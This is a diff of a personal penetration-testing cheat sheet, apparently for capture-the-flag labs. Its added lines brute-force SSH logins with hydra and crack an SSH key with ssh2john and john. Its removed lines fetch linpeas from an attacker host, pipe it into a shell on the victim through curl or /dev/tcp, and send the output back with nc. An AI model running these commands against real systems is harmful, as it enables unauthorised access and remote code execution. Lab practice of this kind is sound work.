@@ -32,11 +32,16 @@ hydra
 hydra -v -V -u -l Mitch -P best110.txt -t 1 -u 10.10.112.72 -s 2222 ssh 
 hydra -L utilisateur.txt -P pass.txt 192.168.29.135 ssh -t 4
 hydra -l mitch -P pass.txt 192.168.29.135 ssh -t 4
+hydra -v -V -u -l Jan -P /usr/share/wordlists/rockyou.txt  -u 10.10.238.166 ssh -t 30 >& logattempt.txt &
+tail -f logattempt.txt
 
 
-SSh 
+SSH 
 ssh mitch@10.10.149.87 -p 2222
 ssh -i rsa_id mitch@10.10.149.87 -p 2222
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+
 
 Hashcat is a powerful and versatile password recovery tool that uses the GPU to perform fast password cracking
 Basic Syntax:
@@ -90,20 +95,3 @@ hashcat -O -a 0 -m 20 passwordhash:pass /usr/share/wordlists/rockyou.txt
 
 escalation
 https://gtfobins.github.io/
-
-# Local network
-sudo python3 -m http.server 80 #Host
-curl 10.10.10.10/linpeas.sh | sh #Victim
-
-# Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-cat < /dev/tcp/10.10.10.10/80 | sh #Victim
-
-# Excute from memory and send output back to the host
-nc -lvnp 9002 | tee linpeas.out #Host
-curl 10.21.109.242:80/linpeas.sh | sh | nc 10.21.109.242 9002 #Victim
-
-
-sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-nc -lvnp 9002 | tee linpeas.out #Host
-cat < /dev/tcp/10.21.109.242/80  | sh | nc 10.21.109.242 9002  
